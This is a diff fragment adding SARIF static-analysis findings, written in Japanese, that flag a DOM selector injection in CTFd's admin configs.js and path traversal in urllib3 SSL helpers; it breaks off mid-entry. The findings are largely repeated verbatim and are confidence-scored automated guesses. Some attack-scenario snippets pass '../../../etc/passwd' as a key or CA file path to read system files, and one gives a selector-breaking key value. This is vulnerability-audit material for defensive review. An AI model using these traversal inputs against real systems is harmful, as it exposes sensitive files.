+            "markdown": "### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/themes/admin/assets/js/pages/configs.js",
+                  "index": 35
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "aba93f605390a773"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "User-controlled JSON keys from theme settings editor",
+            "action": "No validation of key names before DOM selector construction",
+            "resource": "DOM element selection and manipulation",
+            "data_flow": "theme_settings_editor.getValue() → JSON.parse() → form.find([name='${key}'])"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n",
+            "markdown": "### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+                  "index": 36
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "6d9a1bb6385f92c2"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "User-controlled JSON keys from theme settings editor",
+            "action": "No validation of key names before DOM selector construction",
+            "resource": "DOM element selection and manipulation",
+            "data_flow": "theme_settings_editor.getValue() → JSON.parse() → form.find([name='${key}'])"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n",
+            "markdown": "### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+                  "index": 37
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "6d9a1bb6385f92c2"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "User-controlled JSON keys from theme settings editor",
+            "action": "No validation of key names before DOM selector construction",
+            "resource": "DOM element selection and manipulation",
+            "data_flow": "theme_settings_editor.getValue() → JSON.parse() → form.find([name='${key}'])"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n",
+            "markdown": "### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+                  "index": 38
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "6d9a1bb6385f92c2"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "User-controlled JSON keys from theme settings editor",
+            "action": "No validation of key names before DOM selector construction",
+            "resource": "DOM element selection and manipulation",
+            "data_flow": "theme_settings_editor.getValue() → JSON.parse() → form.find([name='${key}'])"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n",
+            "markdown": "### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+                  "index": 39
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "6d9a1bb6385f92c2"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "User-controlled JSON keys from theme settings editor",
+            "action": "No validation of key names before DOM selector construction",
+            "resource": "DOM element selection and manipulation",
+            "data_flow": "theme_settings_editor.getValue() → JSON.parse() → form.find([name='${key}'])"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n",
+            "markdown": "### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+                  "index": 40
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "6d9a1bb6385f92c2"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "User-controlled JSON keys from theme settings editor",
+            "action": "No validation of key names before DOM selector construction",
+            "resource": "DOM element selection and manipulation",
+            "data_flow": "theme_settings_editor.getValue() → JSON.parse() → form.find([name='${key}'])"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n",
+            "markdown": "### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+                  "index": 41
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "6d9a1bb6385f92c2"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "User-controlled JSON keys from theme settings editor",
+            "action": "No validation of key names before DOM selector construction",
+            "resource": "DOM element selection and manipulation",
+            "data_flow": "theme_settings_editor.getValue() → JSON.parse() → form.find([name='${key}'])"
+          }
+        },
+        {
+          "ruleId": "AFO",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "AFO: ## 脆弱性分析: 任意ファイル操作\n\n### 概要\nPrincipal（trust_bundle パラメータ）が、セキュリティコントロール不足でリソース（ファイルシステムアクセス）に到達しています。\n\n### PARフレームワークの観点\n\n**Principal**: \n- `load_verify_locations()` メソッドを通じて`cafile`パラメータとしてユーザーから供給される文字列\n- 信頼できない外部ソース：アプリケーション設定、ユーザー入力など\n\n**Action（不十分なセキュリティコントロール）**:\n- `os.path.isfile(trust_bundle)` による存在確認のみ\n- パスのサニタイゼーション、ホワイトリスト検証、パストラバーサル対策がない\n- 相対パスや `../` を含むパスの検証がない\n\n**Resource**:\n- `open(trust_bundle, \"rb\")` によるファイルシステムへの読み込みアクセス\n- 任意のファイルが読み込まれる可能性がある\n\n### 脆弱性の詳細\n\n1. **Local File Inclusion (LFI)**: ユーザーが制御可能なファイルパスが直接使用される\n2. **Path Traversal**: `../` や絶対パスを使用して、予期しないファイルへのアクセスが可能\n3. **信頼バウンダリの問題**: `load_verify_locations()` で設定されたパスが、後に検証なく使用される\n\n### 攻撃シナリオ\n\n```python\nctx = SecureTransportContext(ssl.PROTOCOL_TLS)\n# 攻撃者が任意のファイルパスを指定\nctx.load_verify_locations(cafile=\"../../../etc/passwd\")\n# 後続の接続で _evaluate_trust が呼び出され、任意ファイルが読み込まれる\n```\n\n### 推奨される修復\n\n1. **ホワイトリスト検証**: 許可されたディレクトリのみからの読み込みに制限\n2. **パス正規化**: `os.path.abspath()` と許可ディレクトリの比較\n3. **パストラバーサル対策**: パスに `../` や `..\\\\` が含まれていないことの確認\n4. **アクセス制御**: ファイルのパーミッションの検証\n",
+            "markdown": "## 脆弱性分析: 任意ファイル操作\n\n### 概要\nPrincipal（trust_bundle パラメータ）が、セキュリティコントロール不足でリソース（ファイルシステムアクセス）に到達しています。\n\n### PARフレームワークの観点\n\n**Principal**: \n- `load_verify_locations()` メソッドを通じて`cafile`パラメータとしてユーザーから供給される文字列\n- 信頼できない外部ソース：アプリケーション設定、ユーザー入力など\n\n**Action（不十分なセキュリティコントロール）**:\n- `os.path.isfile(trust_bundle)` による存在確認のみ\n- パスのサニタイゼーション、ホワイトリスト検証、パストラバーサル対策がない\n- 相対パスや `../` を含むパスの検証がない\n\n**Resource**:\n- `open(trust_bundle, \"rb\")` によるファイルシステムへの読み込みアクセス\n- 任意のファイルが読み込まれる可能性がある\n\n### 脆弱性の詳細\n\n1. **Local File Inclusion (LFI)**: ユーザーが制御可能なファイルパスが直接使用される\n2. **Path Traversal**: `../` や絶対パスを使用して、予期しないファイルへのアクセスが可能\n3. **信頼バウンダリの問題**: `load_verify_locations()` で設定されたパスが、後に検証なく使用される\n\n### 攻撃シナリオ\n\n```python\nctx = SecureTransportContext(ssl.PROTOCOL_TLS)\n# 攻撃者が任意のファイルパスを指定\nctx.load_verify_locations(cafile=\"../../../etc/passwd\")\n# 後続の接続で _evaluate_trust が呼び出され、任意ファイルが読み込まれる\n```\n\n### 推奨される修復\n\n1. **ホワイトリスト検証**: 許可されたディレクトリのみからの読み込みに制限\n2. **パス正規化**: `os.path.abspath()` と許可ディレクトリの比較\n3. **パストラバーサル対策**: パスに `../` や `..\\\\` が含まれていないことの確認\n4. **アクセス制御**: ファイルのパーミッションの検証\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/white-rabbit/src/urllib3/contrib/securetransport.py",
+                  "index": 42
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "3d4d1625c155934"
+          },
+          "properties": {
+            "confidence": 0.7,
+            "mitre_attack": [
+              "T1083",
+              "T1005"
+            ],
+            "cwe": [
+              "CWE-22",
+              "CWE-73"
+            ],
+            "owasp": [
+              "A01:2021-Broken Access Control"
+            ],
+            "principal": "trust_bundle パラメータ（load_verify_locations() を通じてユーザー提供）",
+            "action": "os.path.isfile() による存在確認のみ。パストラバーサルやパス正規化の検証なし",
+            "resource": "ファイルシステムの読み込みアクセス（open(trust_bundle, 'rb')）",
+            "data_flow": "load_verify_locations(cafile) → _trust_bundle → _custom_validate(trust_bundle) → _evaluate_trust(trust_bundle) → open(trust_bundle)"
+          }
+        },
+        {
+          "ruleId": "AFO",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "AFO: ## ローカルファイルインクルージョン脆弱性\n\n### 概要\n`_is_key_file_encrypted()` 関数 (558行) が、検証されていない `key_file` パラメータを直接 `open()` で使用しています。\n\n### 脆弱性の詳細\n\n**Principal (実行主体)**:\n- `ssl_wrap_socket()` 関数の呼び出し側から提供される `keyfile` パラメータ\n- 信頼性: 実装によっては不正な入力を受け入れる可能性\n\n**Action (セキュリティ制御)**: \n- **入力検証**: なし - ファイルパス文字列の妥当性チェックがない\n- **パストラバーサル対策**: なし - `../` や絶対パスの検証がない  \n- **シンボリックリンク検証**: なし - `os.path.islink()` でのチェックがない\n- **権限チェック**: なし - ファイルアクセス権限の確認がない\n\n**Resource (リソース)**:\n- ファイルシステム (`open(key_file)`)\n- ログインユーザーの読み込み権限で任意のファイルを読める\n\n### 攻撃シナリオ\n\n1. **パストラバーサル攻撃**:\n   ```python\n   # 攻撃者が以下を入力\n   ssl_wrap_socket(sock, keyfile=\"../../../etc/passwd\")\n   ```\n   - `/etc/passwd` などの機密ファイルが読み込まれる\n   - ファイル内容の一部が例外メッセージに含まれる\n\n2. **ファイル存在確認**:\n   - 例外の有無でファイル存在を判定可能\n   - T1083: ファイルシステムの列挙\n\n3. **情報開示**:\n   - エラーメッセージからファイルパス情報が露出\n   - ファイルアクセス権限の情報が推測可能\n\n### 影響範囲\n- HTTPSクライアント実装\n- リバースプロキシ / TLS in TLSの実装\n- カスタムSSL設定を使用する環境\n\n### 改善提案\n\n1. **入力検証**:\n   ```python\n   import os\n   def _is_key_file_encrypted(key_file: str) -> bool:\n       # 絶対パスに正規化\n       key_file = os.path.abspath(key_file)\n       # シンボリックリンク検証\n       if os.path.islink(key_file):\n           raise ValueError(f\"Key file must not be a symbolic link: {key_file}\")\n   ```\n\n2. **パストラバーサル対策**:\n   ```python\n   # 許可されたディレクトリ配下にあるか確認\n   allowed_dir = os.path.abspath(\"/etc/ssl/private\")\n   if not key_file.startswith(allowed_dir):\n       raise ValueError(f\"Key file outside allowed directory: {key_file}\")\n   ```\n\n3. **例外処理の強化**:\n   ```python\n   try:\n       with open(key_file) as f:\n           for line in f:\n               if \"ENCRYPTED\" in line:\n                   return True\n   except (OSError, IOError) as e:\n       # スタックトレースで情報露出を防ぐ\n       raise SSLError(f\"Failed to read key file\") from e\n   ```\n\n### データフロー\n`ssl_wrap_socket(keyfile)` → `_is_key_file_encrypted(key_file)` → `open(key_file)` → ファイルシステム\n\n### 参考\n- T1005: Data from Local System\n- T1083: File and Directory Discovery  \n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory\n- CWE-426: Untrusted Search Path\n",
+            "markdown": "## ローカルファイルインクルージョン脆弱性\n\n### 概要\n`_is_key_file_encrypted()` 関数 (558行) が、検証されていない `key_file` パラメータを直接 `open()` で使用しています。\n\n### 脆弱性の詳細\n\n**Principal (実行主体)**:\n- `ssl_wrap_socket()` 関数の呼び出し側から提供される `keyfile` パラメータ\n- 信頼性: 実装によっては不正な入力を受け入れる可能性\n\n**Action (セキュリティ制御)**: \n- **入力検証**: なし - ファイルパス文字列の妥当性チェックがない\n- **パストラバーサル対策**: なし - `../` や絶対パスの検証がない  \n- **シンボリックリンク検証**: なし - `os.path.islink()` でのチェックがない\n- **権限チェック**: なし - ファイルアクセス権限の確認がない\n\n**Resource (リソース)**:\n- ファイルシステム (`open(key_file)`)\n- ログインユーザーの読み込み権限で任意のファイルを読める\n\n### 攻撃シナリオ\n\n1. **パストラバーサル攻撃**:\n   ```python\n   # 攻撃者が以下を入力\n   ssl_wrap_socket(sock, keyfile=\"../../../etc/passwd\")\n   ```\n   - `/etc/passwd` などの機密ファイルが読み込まれる\n   - ファイル内容の一部が例外メッセージに含まれる\n\n2. **ファイル存在確認**:\n   - 例外の有無でファイル存在を判定可能\n   - T1083: ファイルシステムの列挙\n\n3. **情報開示**:\n   - エラーメッセージからファイルパス情報が露出\n   - ファイルアクセス権限の情報が推測可能\n\n### 影響範囲\n- HTTPSクライアント実装\n- リバースプロキシ / TLS in TLSの実装\n- カスタムSSL設定を使用する環境\n\n### 改善提案\n\n1. **入力検証**:\n   ```python\n   import os\n   def _is_key_file_encrypted(key_file: str) -> bool:\n       # 絶対パスに正規化\n       key_file = os.path.abspath(key_file)\n       # シンボリックリンク検証\n       if os.path.islink(key_file):\n           raise ValueError(f\"Key file must not be a symbolic link: {key_file}\")\n   ```\n\n2. **パストラバーサル対策**:\n   ```python\n   # 許可されたディレクトリ配下にあるか確認\n   allowed_dir = os.path.abspath(\"/etc/ssl/private\")\n   if not key_file.startswith(allowed_dir):\n       raise ValueError(f\"Key file outside allowed directory: {key_file}\")\n   ```\n\n3. **例外処理の強化**:\n   ```python\n   try:\n       with open(key_file) as f:\n           for line in f:\n               if \"ENCRYPTED\" in line:\n                   return True\n   except (OSError, IOError) as e:\n       # スタックトレースで情報露出を防ぐ\n       raise SSLError(f\"Failed to read key file\") from e\n   ```\n\n### データフロー\n`ssl_wrap_socket(keyfile)` → `_is_key_file_encrypted(key_file)` → `open(key_file)` → ファイルシステム\n\n### 参考\n- T1005: Data from Local System\n- T1083: File and Directory Discovery  \n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory\n- CWE-426: Untrusted Search Path\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/white-rabbit/src/urllib3/util/ssl_.py",
+                  "index": 43
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "2aff40574a6f43a5"
+          },
+          "properties": {
+            "confidence": 0.7,
+            "mitre_attack": [
+              "T1083",
+              "T1005"
+            ],
+            "cwe": [
+              "CWE-22",
+              "CWE-73"
+            ],
+            "owasp": [
+              "A01:2021-Broken Access Control"
+            ],
+            "principal": "keyfile parameter from ssl_wrap_socket() function",
+            "action": "No input validation, path traversal checks, or symlink verification",
+            "resource": "File system access via open(key_file)",
+            "data_flow": "ssl_wrap_socket(keyfile) → _is_key_file_encrypted(key_file) → open(key_file)"
+          }
+        },
+        {
+          "ruleId": "AFO",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "AFO: ## 脆弱性分析: 任意ファイル操作\n\n### 概要\nPrincipal（trust_bundle パラメータ）が、セキュリティコントロール不足でリソース（ファイルシステムアクセス）に到達しています。\n\n### PARフレームワークの観点\n\n**Principal**: \n- `load_verify_locations()` メソッドを通じて`cafile`パラメータとしてユーザーから供給される文字列\n- 信頼できない外部ソース：アプリケーション設定、ユーザー入力など\n\n**Action（不十分なセキュリティコントロール）**:\n- `os.path.isfile(trust_bundle)` による存在確認のみ\n- パスのサニタイゼーション、ホワイトリスト検証、パストラバーサル対策がない\n- 相対パスや `../` を含むパスの検証がない\n\n**Resource**:\n- `open(trust_bundle, \"rb\")` によるファイルシステムへの読み込みアクセス\n- 任意のファイルが読み込まれる可能性がある\n\n### 脆弱性の詳細\n\n1. **Local File Inclusion (LFI)**: ユーザーが制御可能なファイルパスが直接使用される\n2. **Path Traversal**: `../` や絶対パスを使用して、予期しないファイルへのアクセスが可能\n3. **信頼バウンダリの問題**: `load_verify_locations()` で設定されたパスが、後に検証なく使用される\n\n### 攻撃シナリオ\n\n```python\nctx = SecureTransportContext(ssl.PROTOCOL_TLS)\n# 攻撃者が任意のファイルパスを指定\nctx.load_verify_locations(cafile=\"../../../etc/passwd\")\n# 後続の接続で _evaluate_trust が呼び出され、任意ファイルが読み込まれる\n```\n\n### 推奨される修復\n\n1. **ホワイトリスト検証**: 